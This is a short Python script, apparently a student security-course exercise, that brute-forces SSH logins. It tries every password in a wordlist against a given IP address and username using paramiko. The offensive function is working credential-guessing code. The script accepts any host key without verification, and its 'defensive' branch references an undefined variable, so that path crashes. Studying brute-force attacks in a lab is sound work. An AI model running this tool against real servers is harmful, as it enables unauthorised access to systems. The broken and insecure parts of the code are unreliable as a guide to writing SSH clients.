#!/usr/bin/python3

# Script:                       Ops Challenge 17
# Author:                       Kevin Isaac
# Date of latest revision:      20230207
# Purpose:                       Brute Force Wordlist attack pt2
# Attribution: Alex Wise

        # Task
            # Add to your Python brute force tool the capability to:
                # Authenticate to an SSH server by its IP address.
                # Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.



# Main 

# Import Libraries 
import paramiko
import time

# Define a function to handle the offensive mode
def offensive_mode(ip, username, file_path, delay):
    # Create an instance of the SSHClient
    ssh = paramiko.SSHClient()
    # Set the missing host key policy to AutoAddPolicy
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Open the word list file
    with open(file_path, "r") as f:
        # Read each line of the file
        for line in f:
            # Strip the newline character from each line
            password = line.strip()
            # Try to connect to the SSH server with the current password
            try:
                ssh.connect(ip, username=username, password=password)
                print("Login successful!")
                break
            except:
                # Print the value of the password
                print(password)
                # Sleep for the specified delay
                time.sleep(delay)

    # Close the connection
    ssh.close()

# Define a function to handle the defensive mode
def defensive_mode(ip, username, file_path, user_input):
    # Create an instance of the SSHClient
    ssh = paramiko.SSHClient()
    # Set the missing host key policy to AutoAddPolicy
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Try to connect to the SSH server with the user input as password
    try:
        ssh.connect(ip, username=username, password=user_input)
        print("Password Accepted")
    except:
        print("Wrong Password")

    # Close the connection
    ssh.close()

# Ask the user to choose a mode
mode = input("Which mode? (Offensive/Defensive): ")

# Ask the user for the SSH server IP address
ip = input("Enter the SSH server IP address: ")

# Ask the user for the username
username = input("Enter the username: ")

# Handle the mode selected by the user
if mode.lower() == "offensive":
    # Ask the user for the file path
    file_path = input("Enter the word list file path: ")
    # Ask the user for the delay
    delay = float(input("Enter the delay (in seconds): "))
    # Call the offensive mode function
    offensive_mode(ip, username, file_path, delay)

elif mode.lower() == "defensive":
    # Ask the user for the user input
    user_input = input("Enter the password: ")
    # Call the defensive mode function
    defensive_mode(ip, username, file_path, user_input)
else:
    # If the user selects an invalid mode, display an error message
    print("Invalid mode selected")

# End 
